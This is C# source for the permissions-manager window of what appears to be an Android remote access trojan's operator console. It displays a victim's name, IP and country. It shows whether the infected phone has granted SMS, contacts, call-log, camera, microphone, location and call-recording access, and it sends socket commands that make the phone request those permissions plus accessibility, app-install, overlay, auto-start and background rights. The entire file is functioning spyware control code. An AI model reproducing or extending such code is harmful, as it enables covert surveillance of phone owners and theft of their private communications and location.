            this.checkautostart.Font = new System.Drawing.Font("Calibri", 12F);
            this.checkautostart.Location = new System.Drawing.Point(70, 53);
            this.checkautostart.Margin = new System.Windows.Forms.Padding(2);
            this.checkautostart.Name = "checkautostart";
            this.checkautostart.Padding = new System.Windows.Forms.Padding(16, 0, 0, 0);
            this.checkautostart.Size = new System.Drawing.Size(32, 24);
            this.checkautostart.TabIndex = 16;
            this.checkautostart.MouseClick += new System.Windows.Forms.MouseEventHandler(this.Toggle2_MouseClick);
            // 
            // PictureBox2
            // 
            this.PictureBox2.Location = new System.Drawing.Point(44, 87);
            this.PictureBox2.Margin = new System.Windows.Forms.Padding(2);
            this.PictureBox2.Name = "PictureBox2";
            this.PictureBox2.Size = new System.Drawing.Size(184, 241);
            this.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.PictureBox2.TabIndex = 15;
            this.PictureBox2.TabStop = false;
            // 
            // Label5
            // 
            this.Label5.AutoSize = true;
            this.Label5.Font = new System.Drawing.Font("Calibri", 12F);
            this.Label5.ForeColor = System.Drawing.Color.White;
            this.Label5.Location = new System.Drawing.Point(107, 56);
            this.Label5.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label5.Name = "Label5";
            this.Label5.Size = new System.Drawing.Size(73, 19);
            this.Label5.TabIndex = 14;
            this.Label5.Text = "Auto Start";
            // 
            // PictureBox1
            // 
            this.PictureBox1.Location = new System.Drawing.Point(396, 87);
            this.PictureBox1.Margin = new System.Windows.Forms.Padding(2);
            this.PictureBox1.Name = "PictureBox1";
            this.PictureBox1.Size = new System.Drawing.Size(264, 241);
            this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.PictureBox1.TabIndex = 12;
            this.PictureBox1.TabStop = false;
            // 
            // Label4
            // 
            this.Label4.AutoSize = true;
            this.Label4.Font = new System.Drawing.Font("Calibri", 12F);
            this.Label4.ForeColor = System.Drawing.Color.White;
            this.Label4.Location = new System.Drawing.Point(493, 56);
            this.Label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label4.Name = "Label4";
            this.Label4.Size = new System.Drawing.Size(130, 19);
            this.Label4.TabIndex = 11;
            this.Label4.Text = "Run in Background";
            // 
            // TextBox1
            // 
            this.TextBox1.BackColor = System.Drawing.Color.Black;
            this.TextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.TextBox1.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.TextBox1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.TextBox1.Location = new System.Drawing.Point(0, 320);
            this.TextBox1.Margin = new System.Windows.Forms.Padding(2);
            this.TextBox1.Multiline = true;
            this.TextBox1.Name = "TextBox1";
            this.TextBox1.ReadOnly = true;
            this.TextBox1.Size = new System.Drawing.Size(700, 71);
            this.TextBox1.TabIndex = 0;
            this.TextBox1.Text = "this options is not fully tested as there is different kinds of chinese phones , " +
    "if the phone is not supported nothing will show up on the phone";
            this.TextBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // Panel2
            // 
            this.Panel2.BackColor = System.Drawing.Color.Black;
            this.Panel2.Controls.Add(this.statustext);
            this.Panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.Panel2.Location = new System.Drawing.Point(0, 439);
            this.Panel2.Margin = new System.Windows.Forms.Padding(2);
            this.Panel2.Name = "Panel2";
            this.Panel2.Size = new System.Drawing.Size(700, 24);
            this.Panel2.TabIndex = 31;
            // 
            // statustext
            // 
            this.statustext.BackColor = System.Drawing.Color.Black;
            this.statustext.Dock = System.Windows.Forms.DockStyle.Fill;
            this.statustext.ForeColor = System.Drawing.Color.Lime;
            this.statustext.Location = new System.Drawing.Point(0, 0);
            this.statustext.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.statustext.Name = "statustext";
            this.statustext.Size = new System.Drawing.Size(700, 24);
            this.statustext.TabIndex = 1;
            this.statustext.Text = "...";
            this.statustext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // DrakeUIToolTip1
            // 
            this.DrakeUIToolTip1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(54)))), ((int)(((byte)(54)))));
            this.DrakeUIToolTip1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(239)))), ((int)(((byte)(239)))));
            this.DrakeUIToolTip1.OwnerDraw = true;
            // 
            // Panel3
            // 
            this.Panel3.BackColor = System.Drawing.Color.Black;
            this.Panel3.Controls.Add(this.clinameinfo);
            this.Panel3.Controls.Add(this.ClientPic);
            this.Panel3.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Panel3.ForeColor = System.Drawing.Color.Red;
            this.Panel3.Location = new System.Drawing.Point(0, 0);
            this.Panel3.Margin = new System.Windows.Forms.Padding(2);
            this.Panel3.Name = "Panel3";
            this.Panel3.Size = new System.Drawing.Size(700, 463);
            this.Panel3.TabIndex = 32;
            // 
            // clinameinfo
            // 
            this.clinameinfo.BackColor = System.Drawing.Color.Transparent;
            this.clinameinfo.Dock = System.Windows.Forms.DockStyle.Fill;
            this.clinameinfo.Font = new System.Drawing.Font("Calibri", 9F);
            this.clinameinfo.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.clinameinfo.Location = new System.Drawing.Point(32, 0);
            this.clinameinfo.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.clinameinfo.Name = "clinameinfo";
            this.clinameinfo.Size = new System.Drawing.Size(668, 463);
            this.clinameinfo.TabIndex = 12;
            this.clinameinfo.Text = "...";
            this.clinameinfo.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // ClientPic
            // 
            this.ClientPic.Dock = System.Windows.Forms.DockStyle.Left;
            this.ClientPic.Location = new System.Drawing.Point(0, 0);
            this.ClientPic.Margin = new System.Windows.Forms.Padding(2, 3, 2, 3);
            this.ClientPic.Name = "ClientPic";
            this.ClientPic.Size = new System.Drawing.Size(32, 463);
            this.ClientPic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.ClientPic.TabIndex = 11;
            this.ClientPic.TabStop = false;
            // 
            // PermissionsManager
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(700, 463);
            this.Controls.Add(this.Panel2);
            this.Controls.Add(this.DrakeUITabControl1);
            this.Controls.Add(this.Panel3);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.Margin = new System.Windows.Forms.Padding(2);
            this.Name = "PermissionsManager";
            this.ShowIcon = false;
            this.Text = "PermissionsManager";
            this.TopMost = true;
            this.DrakeUITabControl1.ResumeLayout(false);
            this.TabPage1.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.DGVPRIM)).EndInit();
            this.TabPage2.ResumeLayout(false);
            this.Panel1.ResumeLayout(false);
            this.Panel1.PerformLayout();
            this.TabPage3.ResumeLayout(false);
            this.TabPage3.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox1)).EndInit();
            this.Panel2.ResumeLayout(false);
            this.Panel3.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.ClientPic)).EndInit();
            this.ResumeLayout(false);

	}

	public PermissionsManager()
	{
		base.Load += PermissionsManager_Load;
		Acces_prog = false;
		draw_prog = false;
		install_prog = false;
		battary_prog = false;
		InitializeComponent();
	}

	public void UpdatePrims(object[] obj)
	{
		if (DGVPRIM.InvokeRequired)
		{
			recordnames method = UpdatePrims;
			DGVPRIM.Invoke(method, new object[1] { obj });
			return;
		}
		string[] array = (string[])obj[0];
		if (DGVPRIM.Rows.Count > 0)
			DGVPRIM.Rows.Clear();
		Bitmap bitmap = (Bitmap)Codes.ResizeImage(Resources.correctsign, new Size(45, 45));
		Bitmap bitmap2 = (Bitmap)Codes.ResizeImage(Resources.X_sign, new Size(45, 45));
		try
		{
			if (Operators.CompareString(array[0], "1", TextCompare: false) == 0)
			{
				int index = DGVPRIM.Rows.Add(bitmap, "Accessibility Service", "ON");
				DGVPRIM.Rows[index].Cells[2].Style.ForeColor = Color.Lime;
				Acces_prog = true;
				checkacess.Checked = true;
				checkacess.Enabled = false;
			}
			else
			{
				int index2 = DGVPRIM.Rows.Add(bitmap2, "Accessibility Service", "OFF");
				DGVPRIM.Rows[index2].Cells[2].Style.ForeColor = Color.Red;
				Acces_prog = true;
				checkacess.Checked = false;
				checkacess.Enabled = true;
			}
			if (Operators.CompareString(array[1], "1", TextCompare: false) == 0)
			{
				int index3 = DGVPRIM.Rows.Add(bitmap, "Read Contacts", "ON");
				DGVPRIM.Rows[index3].Cells[2].Style.ForeColor = Color.Lime;
			}
			else
			{
				int index4 = DGVPRIM.Rows.Add(bitmap2, "Read Contacts", "OFF");
				DGVPRIM.Rows[index4].Cells[2].Style.ForeColor = Color.Red;
			}
			if (Operators.CompareString(array[2], "1", TextCompare: false) == 0)
			{
				int index5 = DGVPRIM.Rows.Add(bitmap, "Read SMS", "ON");
				DGVPRIM.Rows[index5].Cells[2].Style.ForeColor = Color.Lime;
			}
			else
			{
				int index6 = DGVPRIM.Rows.Add(bitmap2, "Read SMS", "OFF");
				DGVPRIM.Rows[index6].Cells[2].Style.ForeColor = Color.Red;
			}
			if (Operators.CompareString(array[3], "1", TextCompare: false) == 0)
			{
				int index7 = DGVPRIM.Rows.Add(bitmap, "Read Call Logs", "ON");
				DGVPRIM.Rows[index7].Cells[2].Style.ForeColor = Color.Lime;
			}
			else
			{
				int index8 = DGVPRIM.Rows.Add(bitmap2, "Read Call Logs", "OFF");
				DGVPRIM.Rows[index8].Cells[2].Style.ForeColor = Color.Red;
			}
			if (Operators.CompareString(array[4], "1", TextCompare: false) == 0)
			{
				int index9 = DGVPRIM.Rows.Add(bitmap, "Camera", "ON");
				DGVPRIM.Rows[index9].Cells[2].Style.ForeColor = Color.Lime;
			}
			else
			{
				int index10 = DGVPRIM.Rows.Add(bitmap2, "Camera", "OFF");
				DGVPRIM.Rows[index10].Cells[2].Style.ForeColor = Color.Red;
			}
			if (Operators.CompareString(array[5], "1", TextCompare: false) == 0)
			{
				int index11 = DGVPRIM.Rows.Add(bitmap, "Read Accounts", "ON");
				DGVPRIM.Rows[index11].Cells[2].Style.ForeColor = Color.Lime;
			}
			else
			{
				int index12 = DGVPRIM.Rows.Add(bitmap2, "Read Accounts", "OFF");
				DGVPRIM.Rows[index12].Cells[2].Style.ForeColor = Color.Red;
			}
			if (Operators.CompareString(array[6], "1", TextCompare: false) == 0)
			{
				int index13 = DGVPRIM.Rows.Add(bitmap, "Microphone", "ON");
				DGVPRIM.Rows[index13].Cells[2].Style.ForeColor = Color.Lime;
			}
			else
			{
				int index14 = DGVPRIM.Rows.Add(bitmap2, "Microphone", "OFF");
				DGVPRIM.Rows[index14].Cells[2].Style.ForeColor = Color.Red;
			}
			if (Operators.CompareString(array[7], "1", TextCompare: false) == 0)
			{
				int index15 = DGVPRIM.Rows.Add(bitmap, "Location", "ON");
				DGVPRIM.Rows[index15].Cells[2].Style.ForeColor = Color.Lime;
			}
			else
			{
				int index16 = DGVPRIM.Rows.Add(bitmap2, "Location", "OFF");
				DGVPRIM.Rows[index16].Cells[2].Style.ForeColor = Color.Red;
			}
			if (Operators.CompareString(array[8], "1", TextCompare: false) == 0)
			{
				int index17 = DGVPRIM.Rows.Add(bitmap, "Make Calls", "ON");
				DGVPRIM.Rows[index17].Cells[2].Style.ForeColor = Color.Lime;
			}
			else
			{
				int index18 = DGVPRIM.Rows.Add(bitmap2, "Make Calls", "OFF");
				DGVPRIM.Rows[index18].Cells[2].Style.ForeColor = Color.Red;
			}
			if (Operators.CompareString(array[9], "1", TextCompare: false) == 0)
			{
				int index19 = DGVPRIM.Rows.Add(bitmap, "Record Calls", "ON");
				DGVPRIM.Rows[index19].Cells[2].Style.ForeColor = Color.Lime;
			}
			else
			{
				int index20 = DGVPRIM.Rows.Add(bitmap2, "Record Calls", "OFF");
				DGVPRIM.Rows[index20].Cells[2].Style.ForeColor = Color.Red;
			}
			if (Operators.CompareString(array[10], "1", TextCompare: false) == 0)
			{
				int index21 = DGVPRIM.Rows.Add(bitmap, "Send SMS", "ON");
				DGVPRIM.Rows[index21].Cells[2].Style.ForeColor = Color.Lime;
			}
			else
			{
				int index22 = DGVPRIM.Rows.Add(bitmap2, "Send SMS", "OFF");
				DGVPRIM.Rows[index22].Cells[2].Style.ForeColor = Color.Red;
			}
			if (Operators.CompareString(array[11], "1", TextCompare: false) == 0)
			{
				int index23 = DGVPRIM.Rows.Add(bitmap, "Change Wallpaper", "ON");
				DGVPRIM.Rows[index23].Cells[2].Style.ForeColor = Color.Lime;
			}
			else
			{
				int index24 = DGVPRIM.Rows.Add(bitmap2, "Change Wallpaper", "OFF");
				DGVPRIM.Rows[index24].Cells[2].Style.ForeColor = Color.Red;
			}
			if (Operators.CompareString(array[12], "1", TextCompare: false) == 0)
			{
				int index25 = DGVPRIM.Rows.Add(bitmap, "battery optimizing", "ON");
				DGVPRIM.Rows[index25].Cells[2].Style.ForeColor = Color.Lime;
				battary_prog = true;
				checkbattery.Checked = true;
				checkbattery.Enabled = false;
			}
			else
			{
				int index26 = DGVPRIM.Rows.Add(bitmap2, "battery optimizing", "OFF");
				DGVPRIM.Rows[index26].Cells[2].Style.ForeColor = Color.Red;
				battary_prog = true;
				checkbattery.Checked = false;
				checkbattery.Enabled = true;
			}
			if (Operators.CompareString(array[13], "1", TextCompare: false) == 0)
			{
				int index27 = DGVPRIM.Rows.Add(bitmap, "Draw over apps", "ON");
				DGVPRIM.Rows[index27].Cells[2].Style.ForeColor = Color.Lime;
				draw_prog = true;
				checkdraw.Checked = true;
				checkdraw.Enabled = false;
			}
			else
			{
				int index28 = DGVPRIM.Rows.Add(bitmap2, "Draw over apps", "OFF");
				DGVPRIM.Rows[index28].Cells[2].Style.ForeColor = Color.Red;
				draw_prog = true;
				checkdraw.Checked = false;
				checkdraw.Enabled = true;
			}
			if (Operators.CompareString(array[14], "1", TextCompare: false) == 0)
			{
				int index29 = DGVPRIM.Rows.Add(bitmap, "Install Apps", "ON");
				DGVPRIM.Rows[index29].Cells[2].Style.ForeColor = Color.Lime;
				install_prog = true;
				checkinstall.Checked = true;
				checkinstall.Enabled = false;
			}
			else
			{
				int index30 = DGVPRIM.Rows.Add(bitmap2, "Install Apps", "OFF");
				DGVPRIM.Rows[index30].Cells[2].Style.ForeColor = Color.Red;
				install_prog = true;
				checkinstall.Checked = false;
				checkinstall.Enabled = true;
			}
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	public void UpdateStatus(object[] obj)
	{
		if (statustext.InvokeRequired)
		{
			updatedele method = UpdateStatus;
			statustext.Invoke(method, new object[1] { obj });
		}
		else
		{
			string text = Conversions.ToString(obj[0]);
			statustext.Text = text;
		}
	}

	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		if (Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "RPM<*>[lod]" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
			CraxsAlert.ShowSucess("Loading Permissions Started...");
		}
	}

	private void Addactiv_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(comboproms.Text) | string.IsNullOrWhiteSpace(comboproms.Text))
		{
			CraxsAlert.Showinformation("Select Permission to Add");
			return;
		}
		if (Primslist.Items.Contains(comboproms.Text))
		{
			CraxsAlert.Showinformation("Permission All Ready Add");
			return;
		}
		Primslist.Items.Add(comboproms.Text);
		comboproms.Text = "";
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		if (Classclient == null)
			return;
		try
		{
			if (Primslist.Items.Count < 1)
			{
				CraxsAlert.Showinformation("Add Permissions to list First");
				return;
			}
			string text = "";
			foreach (object item in Primslist.Items)
			{
				string left = Conversions.ToString(item);
				if (Operators.CompareString(left, "Send SMS", TextCompare: false) == 0)
					text += "SS<";
				if (Operators.CompareString(left, "Record Calls", TextCompare: false) == 0)
					text += "RC<";
				if (Operators.CompareString(left, "Change Wallpaper", TextCompare: false) == 0)
					text += "SW<";
				if (Operators.CompareString(left, "Read SMS", TextCompare: false) == 0)
					text += "RS<";
				if (Operators.CompareString(left, "Read Call Logs", TextCompare: false) == 0)
					text += "RCG<";
				if (Operators.CompareString(left, "Read Contacts", TextCompare: false) == 0)
					text += "CRC<";
				if (Operators.CompareString(left, "Read Accounts", TextCompare: false) == 0)
					text += "GA<";
				if (Operators.CompareString(left, "Camera", TextCompare: false) == 0)
					text += "CA<";
				if (Operators.CompareString(left, "Microphone", TextCompare: false) == 0)
					text += "MC<";
				if (Operators.CompareString(left, "Location", TextCompare: false) == 0)
					text += "LOC<";
				if (Operators.CompareString(left, "Make Calls", TextCompare: false) == 0)
					text += "CL<";
			}
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "RPM<*>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
			CraxsAlert.ShowSucess("Loading Permissions Started...");
			Primslist.Items.Clear();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		if (Primslist.Items.Count != 0)
			;
		if (Primslist.Items.Count > 0)
		{
			if (Primslist.SelectedItem != null)
				Primslist.Items.Remove(RuntimeHelpers.GetObjectValue(Primslist.SelectedItem));
			else
				CraxsAlert.Showinformation("Select Permission First");
		}
		else
			CraxsAlert.Showinformation("No Permission to Remove");
	}

	private void Checkacess_MouseClick(object sender, MouseEventArgs e)
	{
		if (checkacess.Enabled && Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "RPM<*>ACC" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
			CraxsAlert.ShowSucess("Request Sent...");
		}
	}

	private void Checkdraw_MouseClick(object sender, MouseEventArgs e)
	{
		if (checkdraw.Enabled && Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "RPM<*>DRW" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
			CraxsAlert.ShowSucess("Request Sent...");
		}
	}

	private void checkbattery_MouseClick(object sender, MouseEventArgs e)
	{
		if (checkbattery.Enabled && Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "RPM<*>DOZ" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
			CraxsAlert.ShowSucess("Request Sent...");
		}
	}

	private void Panel1_Paint(object sender, PaintEventArgs e)
	{
	}

	private void Toggle2_MouseClick(object sender, MouseEventArgs e)
	{
		if (checkautostart.Checked && Classclient != null)
		{
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				Classclient.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "rmiui<*>au" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
	}

	private void Checkbg_MouseClick(object sender, MouseEventArgs e)
	{
		if (Checkbg.Checked && Classclient != null)
		{
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				Classclient.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "rmiui<*>bg" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
	}

	private void DrakeUICheckBox1_MouseClick(object sender, MouseEventArgs e)
	{
		if (checkinstall.Enabled && Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "RPM<*>INST" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
			CraxsAlert.ShowSucess("Request Sent...");
		}
	}

	private void PermissionsManager_Load(object sender, EventArgs e)
	{
		try
		{
			ClientPic.Image = Classclient.Wallpaper;
			clinameinfo.Text = "Name: " + Classclient.ClientName + Strings.Space(2) + "IP: " + Classclient.ClientAddressIP + Strings.Space(2) + "Country: " + Classclient.Country;
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}
}
